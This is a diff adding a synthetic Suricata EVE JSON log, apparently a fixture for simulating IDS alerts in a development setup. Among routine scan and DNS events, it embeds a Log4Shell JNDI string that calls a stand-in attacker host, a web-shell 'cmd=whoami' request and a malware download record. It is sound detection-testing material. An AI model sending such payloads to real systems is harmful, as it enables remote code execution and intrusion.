@@ -1,0 +1,32 @@
+# Sample Suricata EVE JSON Log
+# This file contains synthetic Suricata IDS alerts for development and testing
+# 
+# Format: Suricata EVE (Extensible Event Format) - one JSON object per line
+# Each event represents a security alert or network observation
+#
+# Usage: Can be used with the dev environment log injector to simulate
+#        real-time IDS alerts flowing into Loki
+
+{"timestamp":"2024-11-20T08:15:23.456789+0000","flow_id":1234567890,"event_type":"alert","src_ip":"192.168.1.150","src_port":54321,"dest_ip":"198.51.100.42","dest_port":80,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2100498,"rev":7,"signature":"GPL ATTACK_RESPONSE id check returned root","category":"Potentially Bad Traffic","severity":2},"flow":{"pkts_toserver":5,"pkts_toclient":3,"bytes_toserver":420,"bytes_toclient":1250}}
+
+{"timestamp":"2024-11-20T08:16:45.123456+0000","flow_id":1234567891,"event_type":"alert","src_ip":"192.168.1.200","src_port":443,"dest_ip":"10.0.0.5","dest_port":52341,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2013028,"rev":4,"signature":"ET POLICY PE EXE or DLL Windows file download HTTP","category":"Potential Corporate Privacy Violation","severity":1},"flow":{"pkts_toserver":12,"pkts_toclient":8,"bytes_toserver":1024,"bytes_toclient":51200}}
+
+{"timestamp":"2024-11-20T08:18:12.789012+0000","flow_id":1234567892,"event_type":"alert","src_ip":"192.168.1.75","src_port":49152,"dest_ip":"93.184.216.34","dest_port":443,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2024364,"rev":2,"signature":"ET MALWARE Observed Malicious SSL Cert","category":"A Network Trojan was detected","severity":1},"flow":{"pkts_toserver":8,"pkts_toclient":6,"bytes_toserver":800,"bytes_toclient":2400},"tls":{"subject":"CN=malicious.example.com","issuerdn":"CN=FakeCA"}}
+
+{"timestamp":"2024-11-20T08:20:33.345678+0000","flow_id":1234567893,"event_type":"dns","src_ip":"192.168.1.100","src_port":53421,"dest_ip":"8.8.8.8","dest_port":53,"proto":"UDP","dns":{"type":"query","id":54321,"rrname":"suspicious-domain.tk","rrtype":"A","tx_id":0}}
+
+{"timestamp":"2024-11-20T08:20:34.456789+0000","flow_id":1234567893,"event_type":"dns","src_ip":"8.8.8.8","src_port":53,"dest_ip":"192.168.1.100","dest_port":53421,"proto":"UDP","dns":{"type":"answer","id":54321,"rrname":"suspicious-domain.tk","rrtype":"A","rcode":"NOERROR","answers":[{"rrname":"suspicious-domain.tk","rrtype":"A","ttl":300,"rdata":"185.220.101.42"}]}}
+
+{"timestamp":"2024-11-20T08:22:05.567890+0000","flow_id":1234567894,"event_type":"alert","src_ip":"192.168.1.50","src_port":12345,"dest_ip":"104.21.75.122","dest_port":22,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2001219,"rev":20,"signature":"ET SCAN Potential SSH Scan","category":"Attempted Information Leak","severity":2},"flow":{"pkts_toserver":2,"pkts_toclient":1,"bytes_toserver":120,"bytes_toclient":60}}
+
+{"timestamp":"2024-11-20T08:25:15.678901+0000","flow_id":1234567895,"event_type":"http","src_ip":"192.168.1.120","src_port":55123,"dest_ip":"172.217.16.110","dest_port":80,"proto":"TCP","http":{"hostname":"www.example.com","url":"/suspicious/path.php?cmd=whoami","http_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","http_method":"GET","protocol":"HTTP/1.1","status":200,"length":1024}}
+
+{"timestamp":"2024-11-20T08:28:45.789012+0000","flow_id":1234567896,"event_type":"alert","src_ip":"192.168.1.250","src_port":34567,"dest_ip":"192.168.1.1","dest_port":23,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2100537,"rev":8,"signature":"GPL TELNET login buffer overflow attempt","category":"Attempted Administrator Privilege Gain","severity":1},"flow":{"pkts_toserver":15,"pkts_toclient":12,"bytes_toserver":2048,"bytes_toclient":1536}}
+
+{"timestamp":"2024-11-20T08:30:22.890123+0000","flow_id":1234567897,"event_type":"fileinfo","src_ip":"192.168.1.180","src_port":49876,"dest_ip":"151.101.1.69","dest_port":443,"proto":"TCP","fileinfo":{"filename":"malware.exe","magic":"PE32 executable","state":"CLOSED","stored":false,"size":524288,"tx_id":0},"http":{"hostname":"download.badsite.com","url":"/payload/malware.exe"}}
+
+{"timestamp":"2024-11-20T08:33:10.901234+0000","flow_id":1234567898,"event_type":"alert","src_ip":"10.0.0.5","src_port":8080,"dest_ip":"192.168.1.50","dest_port":52341,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2028371,"rev":3,"signature":"ET EXPLOIT Possible CVE-2021-44228 Log4Shell Attack Attempt","category":"Web Application Attack","severity":1},"http":{"hostname":"vulnerable-app.local","url":"/api/endpoint","http_user_agent":"${jndi:ldap://attacker.com/a}"}}
+
+{"timestamp":"2024-11-20T08:35:45.012345+0000","flow_id":1234567899,"event_type":"flow","src_ip":"192.168.1.25","src_port":443,"dest_ip":"192.168.1.200","dest_port":49321,"proto":"TCP","flow":{"pkts_toserver":125,"pkts_toclient":98,"bytes_toserver":102400,"bytes_toclient":512000,"start":"2024-11-20T08:30:00.000000+0000","end":"2024-11-20T08:35:45.012345+0000","age":345,"state":"closed","reason":"timeout"}}
+
+{"timestamp":"2024-11-20T08:40:15.123456+0000","flow_id":1234567900,"event_type":"alert","src_ip":"192.168.1.88","src_port":51234,"dest_ip":"192.168.1.1","dest_port":161,"proto":"UDP","alert":{"action":"allowed","gid":1,"signature_id":2002910,"rev":5,"signature":"ET SCAN SNMP Community String Brute Force attempt","category":"Attempted Information Leak","severity":2},"flow":{"pkts_toserver":50,"pkts_toclient":0,"bytes_toserver":2500,"bytes_toclient":0}}
